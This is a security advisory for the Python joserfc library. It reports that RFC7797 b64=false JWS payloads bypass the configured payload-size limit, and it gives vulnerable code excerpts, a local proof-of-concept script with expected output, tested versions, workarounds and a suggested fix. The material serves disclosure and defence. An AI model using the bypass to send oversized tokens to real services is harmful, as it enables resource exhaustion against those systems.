# [M] joserfc: b64=false RFC7797 JWS payloads bypass JWSRegistry payload-size limits during deserialization

## Summary
Severity: Medium
Advisory: GHSA-wphv-vfrh-23q5
CVE: CVE-2026-48990
CWE: CWE-400, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-wphv-vfrh-23q5
Type: github-advisory

## Affected
- PyPI: `joserfc` — affected >=1.3.4 <1.6.7

## Details
# RFC7797 b64=false JWS payloads bypass JWSRegistry payload-size limits during deserialization

## Summary

Testing revealed that `joserfc` accepts oversized RFC7797 `b64=false` JWS payloads without applying `JWSRegistry.max_payload_length`.

The normal JWS compact and flattened JSON paths reject payloads above the configured payload-size limit with `ExceededSizeError`. The RFC7797 unencoded payload paths do not make the same check. A valid `b64=false` compact or flattened JSON JWS can therefore deserialize successfully with a payload larger than `JWSRegistry.max_payload_length`.

This creates a moderate availability/resource-exhaustion risk for applications that accept lower-trust JWS values and rely on `joserfc` to reject oversized token content during verification.

## Affected Product

- Package: `joserfc`
- Ecosystem: `pip`
- Audited release: `1.6.5`
- Audit tag: `1.6.5`
- Audit commit: `881712980934fb601bed26fe3ae1ec0b7780e6f7`
- Tested affected releases: `1.3.4`, `1.3.5`, `1.4.2`, `1.6.2`, `1.6.3`, `1.6.4`, `1.6.5`
- Fixed release: none known

## Vulnerability Details

In `joserfc` 1.6.5, the default JWS registry has `max_payload_length = 128000` and exposes `validate_payload_size()`.

The normal compact extraction path calls that check before base64url-decoding the payload. The RFC7797 compact path validates the header and signature segment sizes, then assigns the unencoded payload directly:

```text
if is_rfc7797_enabled(protected):
    if not payload_segment and payload:
        payload_segment = to_bytes(payload)
    payload = payload_segment
```

The flattened JSON RFC7797 path has the same pattern:

```text
payload_segment = value["payload"].encode("utf-8")
if is_rfc7797_enabled(member.headers()):
    payload = payload_segment
```

Neither branch calls `registry.validate_payload_size(payload_segment)` before accepting the unencoded payload.

## Reproduction

The proof below uses only local Python APIs. It signs a payload one byte over the default limit and then compares normal JWS behavior with RFC7797 `b64=false` behavior.

Requirements:

```bash
python -m pip install "joserfc==1.6.5"
```

Run:

```bash
python joserfc_rfc7797_size_bypass_poc.py
```

Self-contained proof script:

```python
#!/usr/bin/env python3
import json

import joserfc
from joserfc import jws
from joserfc.jwk import OctKey


def check_compact(name, header, payload, key):
    token = jws.serialize_compact(header, payload, key)
    try:
        obj = jws.deserialize_compact(token, key)
        return {
            "case": name,
            "accepted": True,
            "exception": None,
            "payload_len_after_deserialize": len(obj.payload),
        }
    except Exception as exc:
        return {
            "case": name,
            "accepted": False,
            "exception": type(exc).__name__,
            "error": str(exc),
        }


def check_json(name, protected, payload, key):
    data = jws.serialize_json({"protected": protected}, payload, key)
    try:
        obj = jws.deserialize_json(data, key)
        return {
            "case": name,
            "accepted": True,
            "exception": None,
            "payload_len_after_deserialize": len(obj.payload),
        }
    except Exception as exc:
        return {
            "case": name,
            "accepted": False,
            "exception": type(exc).__name__,
            "error": str(exc),
        }


key = OctKey.import_key("secret-secret-secret")
limit = jws.default_registry.max_payload_length
payload = "A" * (limit + 1)

results = {
    "joserfc_version": joserfc.__version__,
    "default_max_payload_length": limit,
    "payload_len": len(payload),
    "compact": [
        check_compact("normal_b64_true", {"alg": "HS256"}, payload, key),
        check_compact(
            "rfc7797_b64_false",
            {"alg": "HS256", "b64": False, "crit": ["b64"]},
            payload,
            key,
        ),
    ],
    "json": [
        check_json("normal_b64_true_json", {"alg": "HS256"}, payload, key),
        check_json(
            "rfc7797_b64_false_json",
            {"alg": "HS256", "b64": False, "crit": ["b64"]},
            payload,
            key,
        ),
    ],
}
print(json.dumps(results, indent=2, sort_keys=True))
```

Expected output on `1.6.5` includes:

```json
{
  "default_max_payload_length": 128000,
  "payload_len": 128001,
  "compact": [
    {
      "case": "normal_b64_true",
      "accepted": false,
      "exception": "ExceededSizeError"
    },
    {
      "case": "rfc7797_b64_false",
      "accepted": true,
      "exception": null,
      "payload_len_after_deserialize": 128001
    }
  ],
  "json": [
    {
      "case": "normal_b64_true_json",
      "accepted": false,
      "exception": "ExceededSizeError"
    },
    {
      "case": "rfc7797_b64_false_json",
      "accepted": true,
      "exception": null,
      "payload_len_after_deserialize": 128001
    }
  ]
}
```

## Version Checks

I reproduced the same differential behavior on these releases:

| Version | Normal JWS over limit | RFC7797 `b64=false` over limit |
| --- | --- | --- |
| 1.3.4 | `ExceededSizeError` | accepted |
| 1.3.5 | `ExceededSizeError` | accepted |
| 1.4.2 | `ExceededSizeError` | accepted |
| 1.6.2 | `ExceededSizeError` | accepted |
| 1.6.3 | `ExceededSizeError` | accepted |
| 1.6.4 | `ExceededSizeError` | accepted |
| 1.6.5 | `ExceededSizeError` | accepted |

The exact earliest affected release may be broader. The versions above are the releases I directly tested where the JWS size-limit boundary exists and the RFC7797 path bypasses it.

## Relationship to Existing Advisories

I found two related public advisories for `joserfc`, but neither appears to cover this root cause.

`GHSA-frfh-8v73-gjg4` / `CVE-2025-65015` describes oversized token parts being included in `ExceededSizeError` messages in older release ranges. The issue described here reproduces in `1.6.5` and is not about exception message content. The oversized RFC7797 payload is accepted instead of raising `ExceededSizeError`.

`GHSA-w5r5-m38g-f9f9` / `CVE-2026-27932` describes unbounded PBES2 `p2c` iteration counts during JWE decryption. The issue described here is in JWS RFC7797 payload extraction and does not involve PBES2 or JWE decryption.

## Workarounds

Before a fixed release is available, affected applications can reduce exposure by rejecting oversized serialized JWS inputs before passing them to `joserfc`, disabling or disallowing RFC7797 `b64=false` tokens if not needed, and enforcing strict request/header/body size limits at the application or reverse-proxy layer.

## Suggested Remediation

Apply `registry.validate_payload_size(payload_segment)` to RFC7797 unencoded payloads before assigning them to the JWS object in both compact and flattened JSON extraction paths. Detached RFC7797 compact payloads supplied through the `payload` argument should be checked in the same way.

## References
- https://github.com/authlib/joserfc/security/advisories/GHSA-wphv-vfrh-23q5
- https://nvd.nist.gov/vuln/detail/CVE-2026-48990
- https://github.com/authlib/joserfc
- https://github.com/authlib/joserfc/releases/tag/1.6.7
